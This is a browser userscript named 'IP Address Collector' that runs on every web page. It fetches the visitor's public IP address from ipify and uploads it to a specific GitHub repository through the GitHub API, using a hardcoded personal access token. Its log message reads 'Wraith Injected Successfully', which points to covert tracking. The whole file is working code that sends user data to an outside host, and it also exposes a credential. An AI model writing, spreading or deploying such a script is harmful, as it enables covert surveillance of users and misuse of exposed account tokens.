// ==UserScript==
// @name          IP Address Collector
// @namespace     http://yournamespace.com
// @version       1.0
// @description   Collects and sends user's IP address to GitHub repository
// @match        https://*/*
// @match        http://*/*
// @grant         GM_xmlhttpRequest
// ==/UserScript==
var randomNumber = Math.floor(Math.random() * 1000); // Fetch the user's IP address
GM_xmlhttpRequest({
    method: "GET",
    url: "https://api.ipify.org?format=json",
    onload: function(response) {
        var ipAddress = JSON.parse(response.responseText).ip;

        // Create a new JSON file with the fetched IP address
        var fileContent = JSON.stringify({
            ip: ipAddress
        });
        var fileName = `addr/addr_${randomNumber}.json`;
        var repoOwner = "goofyahhstorageaccount"; // username
        var repoName = "storage"; // repo name
        var token = "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"; // Replace with your GitHub personal access token

        // Send the file to GitHub using GitHub REST API
        GM_xmlhttpRequest({
            method: "PUT",
            url: `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${fileName}`,
            headers: {
                "Authorization": `Bearer ${token}`,
                "Content-Type": "application/json",
            },
            data: JSON.stringify({
                message: "Add IP address",
                content: btoa(fileContent),
                branch: "main", // Replace with desired branch name
            }),
            onload: function(response) {
                console.log("Wraith Injected Successfully (idk put something here)");
            }
        });
    }
});
